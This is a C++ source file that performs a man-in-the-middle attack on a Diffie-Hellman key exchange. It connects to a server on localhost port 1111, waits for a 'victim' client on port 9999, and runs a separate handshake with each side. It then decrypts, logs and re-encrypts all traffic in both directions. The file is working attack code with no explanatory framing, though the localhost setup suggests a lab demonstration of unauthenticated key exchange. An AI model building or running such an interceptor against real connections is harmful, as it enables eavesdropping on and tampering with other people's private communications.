#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <cstring>
#include <thread>
#include <vector>
#include "dh.cpp"

void relay_client_to_server(int client_fd, int server_fd, DHE* dh_client, DHE* dh_server) {
    unsigned char buffer[2048] = {0};
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_read = recv(client_fd, buffer, sizeof(buffer), 0);
        if (bytes_read <= 0) break;

        std::vector<unsigned char> payload(buffer, buffer + bytes_read);
        std::string plaintext = dh_client->decrypt(payload);

        std::cout << "\n[INTERCEPT C->S]: " << plaintext << std::endl;

        std::vector<unsigned char> re_encrypted = dh_server->encrypt(plaintext);
        send(server_fd, re_encrypted.data(), re_encrypted.size(), 0);
    }
}

void relay_server_to_client(int client_fd, int server_fd, DHE* dh_client, DHE* dh_server) {
    unsigned char buffer[2048] = {0};
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes_read = recv(server_fd, buffer, sizeof(buffer), 0);
        if (bytes_read <= 0) break;

        std::vector<unsigned char> payload(buffer, buffer + bytes_read);
        std::string plaintext = dh_server->decrypt(payload);

        std::cout << "\n[INTERCEPT S->C]: " << plaintext << std::endl;

        std::vector<unsigned char> re_encrypted = dh_client->encrypt(plaintext);
        send(client_fd, re_encrypted.data(), re_encrypted.size(), 0);
    }
}

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in real_server_addr;
    real_server_addr.sin_family = AF_INET;
    real_server_addr.sin_port = htons(1111);
    
    inet_pton(AF_INET, "127.0.0.1", &real_server_addr.sin_addr); 

    if (connect(server_fd, (struct sockaddr*)&real_server_addr, sizeof(real_server_addr)) < 0) {
        std::cerr << "[MITM] Failed to connect to real server\n";
        return 1;
    }
    std::cout << "[MITM] Connected to real Server.\n";

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in mitm_addr;
    mitm_addr.sin_family = AF_INET;
    mitm_addr.sin_port = htons(9999); 
    mitm_addr.sin_addr.s_addr = INADDR_ANY;

    bind(listen_fd, (struct sockaddr*)&mitm_addr, sizeof(mitm_addr));
    listen(listen_fd, 1);
    
    std::cout << "[MITM] Waiting for victim client on port 9999...\n";
    int client_fd = accept(listen_fd, nullptr, nullptr);
    std::cout << "[MITM] Victim Client connected!\n";

    DHE dh_server_facing; 
    DHE dh_client_facing; 
    dh_server_facing.generateKeys();
    dh_client_facing.generateKeys();

    int p_len_s = BN_num_bytes(dh_server_facing.pub_key);
    std::vector<unsigned char> p_bytes_s(p_len_s);
    BN_bn2bin(dh_server_facing.pub_key, p_bytes_s.data());
    send(server_fd, p_bytes_s.data(), p_len_s, 0);

    unsigned char real_server_pub[256] = {0};
    recv(server_fd, real_server_pub, sizeof(real_server_pub), 0);
    BIGNUM* bn_s = BN_new();
    BN_bin2bn(real_server_pub, 256, bn_s);
    dh_server_facing.compute_key(bn_s);
    BN_free(bn_s);

    int p_len_c = BN_num_bytes(dh_client_facing.pub_key);
    std::vector<unsigned char> p_bytes_c(p_len_c);
    BN_bn2bin(dh_client_facing.pub_key, p_bytes_c.data());
    send(client_fd, p_bytes_c.data(), p_len_c, 0);

    unsigned char real_client_pub[256] = {0};
    recv(client_fd, real_client_pub, sizeof(real_client_pub), 0);
    BIGNUM* bn_c = BN_new();
    BN_bin2bn(real_client_pub, 256, bn_c);
    dh_client_facing.compute_key(bn_c);
    BN_free(bn_c);

    std::cout << "[MITM] Handshakes complete. Logging traffic...\n";

    std::thread t1(relay_client_to_server, client_fd, server_fd, &dh_client_facing, &dh_server_facing);
    std::thread t2(relay_server_to_client, client_fd, server_fd, &dh_client_facing, &dh_server_facing);

    t1.join();
    t2.join();
    return 0;
}